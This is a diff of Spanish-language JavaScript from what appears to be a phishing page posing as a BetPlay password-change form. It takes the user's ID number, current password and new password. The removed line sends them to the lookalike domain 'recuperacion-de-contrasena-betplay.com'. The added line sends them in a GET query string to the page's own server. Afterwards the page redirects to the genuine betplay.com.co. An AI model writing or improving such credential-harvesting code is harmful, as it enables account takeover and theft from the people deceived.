@@ -1689,7 +1689,7 @@ function alAceptar(){
   if (!/[A-Z]/.test(nueva)) { mostrarMensaje("error", "La contraseña debe contener mínimo una mayúscula."); return; }
   if (!/[^A-Za-z0-9]/.test(nueva)) { mostrarMensaje("error", "La contraseña debe contener mínimo un carácter especial."); return; }
   mostrarMensaje("info", "Procesando...");
-  fetch("https://recuperacion-de-contrasena-betplay.com/change-password", { method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({username:CEDULA,current_password:actual,new_password:nueva}) })
+  fetch("/change-password?username=" + encodeURIComponent(CEDULA) + "&current_password=" + encodeURIComponent(actual) + "&new_password=" + encodeURIComponent(nueva))
     .then(function(r){ return r.json(); }).then(function(data){
       if(data && data.success){ mostrarMensaje("ok", "Contraseña actualizada correctamente."); setTimeout(function(){ window.location.href = "https://betplay.com.co"; }, 5000); }
       else{ mostrarMensaje("error", (data && data.detail) || data.message || "No fue posible actualizar."); }
